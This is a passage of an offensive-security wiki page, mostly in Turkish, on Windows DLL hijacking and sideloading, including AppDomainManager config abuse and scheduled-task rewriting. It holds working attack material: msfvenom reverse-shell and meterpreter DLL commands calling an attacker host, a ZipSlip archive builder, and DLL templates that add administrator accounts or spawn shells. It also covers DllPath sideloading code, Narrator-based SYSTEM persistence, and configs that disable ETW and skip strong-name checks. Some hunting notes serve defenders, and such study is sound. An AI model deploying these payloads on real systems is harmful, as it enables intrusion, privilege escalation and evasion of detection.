# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking, güvenilir bir uygulamayı kötü amaçlı bir DLL yükleyecek şekilde manipüle etmeyi içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Temel olarak code execution, persistence elde etmek ve daha nadiren privilege escalation için kullanılır. Burada escalation'a odaklanılsa da, hijacking yöntemi hedeflerden bağımsız olarak aynı kalır.

### Common Techniques

DLL hijacking için, her biri uygulamanın DLL yükleme stratejisine bağlı olarak etkinliği değişen birkaç yöntem kullanılır:

1. **DLL Replacement**: Gerçek bir DLL'yi kötü amaçlı olanla değiştirmek, isteğe bağlı olarak orijinal DLL'nin işlevselliğini korumak için DLL Proxying kullanmak.
2. **DLL Search Order Hijacking**: Kötü amaçlı DLL'yi, meşru olanın önünde bir search path'e yerleştirerek uygulamanın search pattern'ini istismar etmek.
3. **Phantom DLL Hijacking**: Bir uygulamanın, var olmayan gerekli bir DLL olduğunu sanarak yüklemesi için kötü amaçlı bir DLL oluşturmak.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` veya `.exe.manifest` / `.exe.local` dosyaları gibi search parametrelerini değiştirmek.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir karşılığıyla değiştirmek; bu yöntem sıklıkla DLL side-loading ile ilişkilidir.
6. **Relative Path DLL Hijacking**: Kötü amaçlı DLL'yi, kopyalanmış uygulama ile birlikte kullanıcı tarafından kontrol edilen bir dizine yerleştirmek; Binary Proxy Execution tekniklerine benzer.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecine attacker code yükletmenin tek yolu değildir. Hedef executable bir **managed** uygulama ise, CLR ayrıca executable ile aynı adı taşıyan bir **application configuration file** dosyasına bakar (örneğin `Setup.exe.config`). Bu dosya, özel bir **AppDomainManager** tanımlayabilir. Eğer config, EXE'nin yanına yerleştirilmiş attacker-controlled bir assembly'yi işaret ediyorsa, CLR onu **uygulamanın normal code path'inden önce** yükler ve güvenilir process içinde çalıştırır.

Microsoft'un .NET Framework configuration schema'sına göre, custom manager'ın kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` mevcut olmalıdır.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Pratik notlar:
- Bu, **.NET Framework’e özel** bir tradecraft’tır. Win32 DLL search order’a değil, CLR config parsing’e dayanır.
- Host gerçekten bir **managed EXE** olmalıdır. Hızlı triage: `sigcheck -m target.exe`, `corflags target.exe`, veya PE metadata’da **CLR Runtime Header** kontrol edin.
- config dosya adı executable adıyla tam eşleşmelidir (`<binary>.config`) ve genellikle **EXE’nin yanında** bulunur.
- Bu, **signed Microsoft/vendor binaries** ile faydalıdır çünkü trusted EXE değişmeden kalır, malicious managed assembly ise in-process çalışır.
- Eğer zaten writable bir installer/update directory’niz varsa, AppDomainManager hijacking **first stage** olarak kullanılabilir; ardından sonraki aşamalar için klasik DLL sideloading veya reflective loading yapılabilir.

### Mevcut bir scheduled task’i hijack edip sideload chain’i yeniden başlatmak

Persistence için sadece **creating a new task** aramayın. Bazı intrusion set’ler, meşru bir installer’ın bir **normal updater task** oluşturmasını bekler ve sonra defender’lar için tanıdık kalan mevcut name, author ve trigger’ı korumak için **task action**’ı yeniden yazar.

Yeniden kullanılabilir workflow:
1. Meşru software’i install/run edin ve normalde oluşturduğu task’i tespit edin.
2. Task XML’ini export edin ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not alın.
3. Sadece action’ı değiştirin; böylece task, user-writable bir staging directory’den sizin **trusted host EXE**’nizi başlatır, ardından gerçek payload’i side-load eder veya AppDomain-load eder.
4. Yeni, bariz bir persistence artifact oluşturmak yerine aynı task name’i yeniden register edin.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Stealthier olmasının nedeni:
- Task adı hala meşru görünebilir (örneğin bir vendor updater).
- **Task Scheduler service** bunu başlatır, bu yüzden parent/ancestor validation çoğu zaman `explorer.exe` yerine beklenen scheduling chain’i görür.
- Sadece **yeni task isimleri** avlayan DFIR ekipleri, kaydı zaten موجود olan ama action’ı artık `%LOCALAPPDATA%`, `%APPDATA%` ya da başka bir attacker-controlled path’e işaret eden bir task’i kaçırabilir.

Hızlı hunting pivot’ları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata’sını bir baseline ile karşılaştırın.
- Bir **vendor-looking updater task** **user-writable directories** içinden çalıştığında veya yanındaki `*.config` dosyasıyla birlikte bir .NET EXE başlattığında alert verin.

> [!TIP]
> HTML staging, AES-CTR configs ve .NET implants’i DLL sideloading üzerine katmanlayan adım adım bir chain için aşağıdaki workflow’u inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik Dlls bulma

Sistem içinde eksik Dlls bulmanın en yaygın yolu, sysinternals’tan [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) çalıştırmak ve **aşağıdaki 2 filter’ı** **ayarlamaktır**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

ve sadece **File System Activity**’yi göstermek:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

**Genel olarak missing dlls** arıyorsanız bunu birkaç **seconds** boyunca çalışır halde bırakın.\
Belirli bir executable içinde **missing dll** arıyorsanız **"Process Name" "contains" `<exec name>`** gibi başka bir filter ayarlamalı, çalıştırmalı ve event capture’ı durdurmalısınız.

## Missing Dlls exploiting

Privilege yükseltmek için en iyi şansımız, bir privilege process’in yüklemeye çalışacağı bir **dll yazabilmek** ve bunun **aranacağı bir yerde** bulunmasını sağlamaktır. Bu yüzden, bir dll’i **orijinal dll**’in bulunduğu klasörden önce aranacak bir **folder** içine **yazabilirsek** (weird case), ya da dll’in aranacağı bir **folder** içine **yazabilirsek** ve orijinal **dll** hiçbir folder’da mevcut değilse bunu yapabiliriz.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** DLL’leri, belirli bir sırayı izleyen **pre-defined search paths** kümesine göre arar. DLL hijacking sorunu, zararlı bir DLL bu dizinlerden birine stratejik olarak yerleştirildiğinde ortaya çıkar; böylece authentic DLL’den önce yüklenir. Bunu önlemenin bir çözümü, uygulamanın ihtiyaç duyduğu DLL’lere referans verirken absolute paths kullanmasını sağlamaktır.

Aşağıda **32-bit** sistemler için **DLL search order**’ı görebilirsiniz:

1. Application’ın yüklendiği directory.
2. System directory. Bu directory’nin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function’ını kullanın.(_C:\Windows\System32_)
3. 16-bit system directory. Bu directory’nin yolunu alan bir function yoktur, ancak aranır. (_C:\Windows\System_)
4. Windows directory. Bu directory’nin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function’ını kullanın.
1. (_C:\Windows_)
5. Current directory.
6. PATH environment variable içinde listelenen directories. Bunun, **App Paths** registry key ile belirtilen per-application path’i içermediğine dikkat edin. **App Paths** key’i DLL search path hesaplanırken kullanılmaz.

Bu, **SafeDllSearchMode** enabled iken varsayılan search order’dır. Disabled olduğunda current directory ikinci sıraya yükselir. Bu özelliği disable etmek için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value’sunu oluşturun ve 0 yapın (default olarak enabled’dır).

Eğer [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function’ı **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa, arama **LoadLibraryEx**’in yüklediği executable module’ün directory’sinde başlar.

Son olarak, **bir dll yalnızca adı yerine absolute path belirtilerek de yüklenebilir**. Bu durumda o dll **sadece o path içinde aranır** (dll’in dependency’leri varsa, onlar da yeni yüklenmiş gibi name ile aranır).

Search order’ı değiştirmek için başka yollar da vardır ama burada onları açıklamayacağım.

### Arbitrary file write’ı missing-DLL hijack ile chain’leme

1. **ProcMon** filters (`Process Name` = target EXE, `Path` `.dll` ile bitiyor, `Result` = `NAME NOT FOUND`) kullanarak process’in denediği ama bulamadığı DLL isimlerini toplayın.
2. Binary bir **schedule/service** üzerinde çalışıyorsa, bu isimlerden biriyle bir DLL’i **application directory** içine (search-order entry #1) bırakmak, sonraki execution’da bunun yüklenmesini sağlar. Bir .NET scanner case’inde process, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` içinden yüklemeden önce `hostfxr.dll` dosyasını `C:\samples\app\` içinde arıyordu.
3. Herhangi bir export içeren bir payload DLL (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive’iniz bir **ZipSlip-style arbitrary write** ise, extraction dir dışına çıkan bir ZIP entry’si hazırlayın, böylece DLL app folder’a düşsün:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Archive’ı izlenen inbox/share’a teslim et; scheduled task process’i yeniden başlattığında malicious DLL’i yükler ve code’unu service account olarak execute eder.

### RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden sideloading zorlamak

Yeni oluşturulan bir process’in DLL search path’ini deterministik olarak etkilemenin gelişmiş bir yolu, ntdll’in native APIs’leri ile process oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada attacker-controlled bir directory sağlayarak, imported bir DLL’i name ile resolve eden bir target process (absolute path kullanmayan ve safe loading flags kullanmayan) bu directory’den malicious bir DLL yüklemeye zorlanabilir.

Key idea
- Process parameters’ı RtlCreateProcessParametersEx ile oluştur ve controlled folder’ını işaret eden custom bir DllPath sağla (ör. dropper/unpacker’ın bulunduğu directory).
- Process’i RtlCreateUserProcess ile oluştur. Target binary bir DLL’i name ile resolve ettiğinde, loader resolution sırasında bu sağlanan DllPath’i dikkate alır; böylece malicious DLL target EXE ile aynı konumda olmasa bile güvenilir sideloading sağlanır.

Notes/limitations
- Bu, oluşturulan child process’i etkiler; current process’i yalnızca etkileyen SetDllDirectory’den farklıdır.
- Target, bir DLL’i name ile import etmeli veya LoadLibrary kullanmalı (absolute path olmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalı).
- KnownDLLs ve hardcoded absolute paths hijack edilemez. Forwarded exports ve SxS önceliği değiştirebilir.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasyonel kullanım örneği
- Gerekli fonksiyonları export eden veya gerçek olanı proxy eden kötü amaçlı bir xmllite.dll dosyasını DllPath dizinine yerleştirin.
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını ada göre aradığı bilinen imzalı bir binary başlatın. loader, import'u sağlanan DllPath üzerinden çözer ve DLL’inizi sideload eder.

Bu tekniğin, in-the-wild ortamında çok aşamalı sideloading zincirlerini çalıştırmak için kullanıldığı gözlemlenmiştir: ilk launcher bir helper DLL bırakır, ardından Microsoft tarafından imzalanmış, hijack edilebilir bir binary’yi custom bir DllPath ile çalıştırarak attacker’ın DLL’inin staging dizininden yüklenmesini zorlar.


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** hedefleri için, sideloading **Main() öncesinde** bellek yamalamadan, uygulamanın yanındaki **`.exe.config`** dosyası kötüye kullanılarak yapılabilir. Sadece Win32 DLL search order’a güvenmek yerine, attacker meşru bir .NET EXE’nin yanına kötü amaçlı bir config ve bir veya daha fazla attacker-controlled assembly yerleştirir.

Zincir nasıl çalışır:
1. Host EXE başlar ve **CLR `<exe>.config`** dosyasını okur.
2. Config, çalışma zamanının attacker-controlled bir `AppDomainManager` oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** ayarlar.
3. Kötü amaçlı manager, güvenilir host process içinde **pre-`Main()` execution** alır.
4. Aynı config, CLR’nin yerel assembly’leri önce çözmesini zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patching olmadan runtime validation/telemetry’yi zayıflatabilir.

Campaign-style pattern (exact nesting can vary by directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Why this is useful:
- **`<probing privatePath="."/>`** assembly resolution’ı uygulama dizininde tutar ve klasörü öngörülebilir bir sideloading yüzeyi haline getirir.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization sırasında, meşru uygulama mantığı çalışmadan önce yürütmeyi attacker koduna taşır.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** tam-trust bir uygulamanın unsigned veya değiştirilmiş assembly’leri strong-name validation failure olmadan yüklemesine izin verebilir.
- **`<publisherPolicy apply="no"/>`** publisher-policy yönlendirmelerini daha yeni assembly’lere gitmeden engeller.
- **`<requiredRuntime ... safemode="true"/>`** runtime seçimini daha deterministik hale getirir.
- **`<etwEnable enabled="false"/>`** özellikle ilginçtir çünkü **CLR kendi ETW visibility’sini** konfigürasyondan devre dışı bırakır; implant’ın `EtwEventWrite`’ı memory’de patch etmesi gerekmez.

Recent campaigns’te görülen operational pattern:
- Stage 1 `setup.exe`, `setup.exe.config` ve local assembly’leri bırakır.
- Stage 2 bunları inandırıcı bir **AppData update** klasörüne kopyalar, host’u `update.exe` gibi bir şeye yeniden adlandırır ve bir **scheduled task** üzerinden tekrar başlatır.
- Stage 3 final RAT DLL/export’u yüklemeden önce execution context’i doğrular (örneğin Task Scheduler’dan beklenen parent `svchost.exe`).

Hunting ideas:
- User-writable konumlarda şüpheli bitişik **`.config`** dosyalarıyla çalışan, imzalı ya da başka şekilde meşru **.NET executables**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- **`%LOCALAPPDATA%`** içinden veya uygulamaya özel `\bin\update\` dizinlerinden yeniden adlandırılmış update binary’leri tekrar başlatan scheduled task’ler.
- Scheduled task’in trusted bir .NET host başlatıp ardından kendi dizininden vendor dışı assembly’leri hemen yüklediği parent/child zincirleri.

#### Exceptions on dll search order from Windows docs

Windows documentation’da standart DLL search order için bazı exceptions belirtilir:

- Halihazırda memory’de yüklü bir DLL ile aynı ada sahip bir **DLL** ile karşılaşıldığında, sistem normal aramayı atlar. Bunun yerine default olarak memory’de zaten bulunan DLL’e geçmeden önce redirection ve manifest kontrolü yapar. **Bu senaryoda sistem DLL için arama yapmaz**.
- DLL, mevcut Windows sürümü için bir **known DLL** olarak tanınırsa, sistem known DLL’in kendi sürümünü ve ona bağlı DLL’leri kullanır; **arama sürecini atlar**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bu known DLL’lerin listesini tutar.
- Bir **DLL’nin bağımlılıkları** varsa, bu dependent DLL’lerin araması, ilk DLL tam path ile belirlenmiş olsa bile, yalnızca **module names** ile belirtilmişler gibi yapılır.

### Escalating Privileges

**Requirements**:

- Farklı privileges altında çalışan veya çalışacak bir process belirleyin (horizontal or lateral movement), bu process bir **DLL** eksik.
- **DLL**’in **aranacağı** herhangi bir **directory** için **write access** olduğundan emin olun. Bu konum executable’ın dizini veya system path içindeki bir dizin olabilir.

Evet, gereksinimleri bulmak zordur çünkü **default olarak privileged bir executable bulup içinde bir dll eksik olması biraz tuhaf** ve **system path** klasöründe write permission olması daha da tuhaftır (default olarak olamaz). Ama misconfigured environment’larda bu mümkündür.\
Şanslıysanız ve gereksinimleri karşıladığınızı görürseniz, [UACME](https://github.com/hfiref0x/UACME) projesini kontrol edebilirsiniz. Projenin ana amacı **UAC bypass** olsa bile, orada Windows sürümü için kullanabileceğiniz bir Dll hijaking **PoC** bulabilirsiniz (muhtemelen sadece write permission sahibi olduğunuz klasörün path’ini değiştirmeniz gerekir).

Bir klasördeki izinlerinizi şöyle **check** edebileceğinizi unutmayın:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Ve **PATH** içindeki tüm klasörlerin **izinlerini** kontrol et:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ayrıca bir executable'in imports'larını ve bir dll'in exports'larını şununla kontrol edebilirsin:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)system PATH içindeki herhangi bir klasöre yazma izniniz olup olmadığını kontrol eder.\
Diğer ilginç otomatik araçlar bu vulnerability'yi keşfetmek için **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Example

Eğer istismar edilebilir bir senaryo bulursanız, bunu başarıyla istismar etmek için en önemli şeylerden biri, executable'ın içinden import edeceği tüm functions'ları en azından export eden bir dll **create etmek** olur. Her neyse, Dll Hijacking'in [**Medium Integrity level**'dan **High**'a (**bypassing UAC**)](../../authentication-credentials-uac-and-efs/index.html#uac) veya[ **High Integrity**'den **SYSTEM**'e yükseltme](../index.html#from-high-integrity-to-system)**.** için çok işe yaradığını not edin. **Valid bir dll nasıl oluşturulur** örneğini bu execution odaklı dll hijacking çalışmasında bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **bir sonraki sectio**n içinde **templates** olarak yararlı olabilecek veya **gereksiz functions export edilmiş bir dll create etmek** için bazı **basic dll codes** bulabilirsiniz.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Temel olarak bir **Dll proxy**, yüklenildiğinde kötü amaçlı kodunuzu **execute** edebilen ama aynı zamanda **real library**'ye tüm çağrıları ileterek beklendiği gibi **expose** ve **work** eden bir Dll'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla gerçekten bir executable belirtebilir ve **proxify** etmek istediğiniz library'yi seçebilir ve **proxified dll** oluşturabilirsiniz ya da **Dll**'i belirtebilir ve **proxified dll** oluşturabilirsiniz.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir meterpreter alın (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Bir kullanıcı oluşturun (x86, x64 sürümünü görmedim):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Kendi

Dikkat edin ki birkaç durumda derlediğiniz Dll, kurban süreç tarafından yüklenecek **birden çok function export etmelidir**; eğer bu functions mevcut değilse **binary bunları yükleyemeyecek** ve **exploit başarısız olacaktır**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Kullanıcı oluşturan C++ DLL örneği</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Thread girişi olan Alternatif C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir localization DLL dosyasını hâlâ kontrol eder; bu dosya arbitrary code execution ve persistence için hijack edilebilir.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Eğer yazılabilir, attacker-controlled bir DLL OneCore yolunda mevcutsa, yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Export gerekmez.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path için yapılan yükleme denemesini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
- Naive bir hijack UI’yi konuşur/vurgular. Sessiz kalmak için attach sırasında Narrator thread’lerini enumerate et, ana thread’i (`OpenThread(THREAD_SUSPEND_RESUME)`) aç ve `SuspendThread` ile durdur; kendi thread’inde devam et. Tam kod için PoC’ye bak.

Accessibility configuration ile trigger ve persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle, Narrator başlatıldığında planted DLL yüklenir. Secure desktop’ta (logon screen), Narrator’ı başlatmak için CTRL+WIN+ENTER’a bas; DLL’in secure desktop üzerinde SYSTEM olarak çalışır.

RDP ile tetiklenen SYSTEM execution (lateral movement)
- Klasik RDP security layer’a izin ver: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host’a RDP ile bağlan, logon screen’de Narrator’ı başlatmak için CTRL+WIN+ENTER’a bas; DLL’in secure desktop üzerinde SYSTEM olarak çalışır.
- RDP session kapanınca execution durur—hemen inject/migrate et.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) registry entry’sini kopyalayabilirsin (örn. CursorIndicator), bunu istediğin binary/DLL’ye işaret edecek şekilde düzenleyip import edebilirsin; ardından `configuration` değerini o AT adıyla ayarlarsın. Bu, Accessibility framework altında arbitrary execution sağlar.

Notlar
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek admin rights gerektirir.
- Tüm payload logic `DLL_PROCESS_ATTACH` içinde olabilir; export gerekmez.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu örnek, Lenovo'nun TrackPoint Quick Menu (`TPQMAssistant.exe`) içindeki **Phantom DLL Hijacking** tekniğini gösterir; bu açık **CVE-2025-1729** olarak izlenir.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` konumu `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, oturum açmış user context altında her gün 9:30 AM’de çalışır.
